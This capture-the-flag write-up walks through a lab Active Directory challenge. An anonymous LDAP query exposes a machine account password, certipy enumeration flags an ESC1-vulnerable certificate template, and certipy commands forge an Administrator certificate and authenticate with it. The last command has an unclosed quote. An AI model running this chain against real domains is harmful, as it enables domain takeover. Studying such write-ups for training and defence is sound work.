# AKTIVKATALOG 1

> Can't be that hard, right?
> The flag is located in C:\Users\Administratör\Desktop\flag.txt on the DC01 machine.

Looking in the output of this LDAP query:

```bash
nxc ldap dc01.hack.lu -u '' -p '' --query "(sAMAccountName=*)" ""
```

We see `unixUserPassword: vy6A8VGpN7gMxZ` for the account `dator$`.

Then using certipy we can find vulnerable cert templates:

```bash
certipy -debug find -u 'dator$@hack.lu' -p 'vy6A8VGpN7gMxZ' -dc-ip '10.244.0.10' -text -enabled -hide-admins
```

This gives the following output:

```
Certificate Authorities
  0
    CA Name                             : hack-DC01-CA
    DNS Name                            : DC01.hack.lu
    Certificate Subject                 : CN=hack-DC01-CA, DC=hack, DC=lu
    Certificate Serial Number           : 49A6DF796B66B08746F83C67B8A882D3
    Certificate Validity Start          : 2025-10-08 14:46:23+00:00
    Certificate Validity End            : 2030-10-08 14:55:34+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : HACK.LU\Authenticated Users
Certificate Templates
  0
    Template Name                       : köttbullar
    Display Name                        : köttbullar
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:59:46+00:00
    Template Last Modified              : 2025-10-08T14:59:46+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACK.LU\Domändatorer
      Object Control Permissions
        Full Control Principals         : HACK.LU\Local System
        Write Owner Principals          : HACK.LU\Local System
        Write Dacl Principals           : HACK.LU\Local System
    [+] User Enrollable Principals      : HACK.LU\Domändatorer
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  1
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos-autentisering
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  2
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Replikering av katalogens e-post
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  3
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Autentisering av domänkontrollant
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  4
    Template Name                       : SubCA
    Display Name                        : Underordnad certifikatutfärdare
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  5
    Template Name                       : WebServer
    Display Name                        : Webbserver
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  6
    Template Name                       : DomainController
    Display Name                        : Domänkontrollant
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  7
    Template Name                       : Machine
    Display Name                        : Dator
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACK.LU\Domändatorer
      Object Control Permissions
        Write Property Enroll           : HACK.LU\Domändatorer
    [+] User Enrollable Principals      : HACK.LU\Domändatorer
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  8
    Template Name                       : EFSRecovery
    Display Name                        : Återställningsagent för krypterande filsystem
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  9
    Template Name                       : Administrator
    Display Name                        : Administratör
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
  10
    Template Name                       : EFS
    Display Name                        : Enkelt krypterande filsystem
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACK.LU\Domänanvändare
      Object Control Permissions
        Write Property Enroll           : HACK.LU\Domänanvändare
    [+] User Enrollable Principals      : HACK.LU\Domänanvändare
  11
    Template Name                       : User
    Display Name                        : Användare
    Certificate Authorities             : hack-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-08T14:56:23+00:00
    Template Last Modified              : 2025-10-08T14:56:23+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACK.LU\Domänanvändare
      Object Control Permissions
        Write Property Enroll           : HACK.LU\Domänanvändare
    [+] User Enrollable Principals      : HACK.LU\Domänanvändare
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

Finally we can exploit the tamplate `köttbullar` using:

```bash
certipy -debug req -u 'dator$@hack.lu' -p 'vy6A8VGpN7gMxZ' -dc-ip '10.244.0.10' -ca 'hack-DC01-CA' -template 'köttbullar' \
        -upn 'Administrator@hack.lu' -sid 'S-1-5-21-215134972-1129381140-2588549801-500

certipy -debug auth -pfx administrator.pfx -dc-ip 10.244.0.10
```
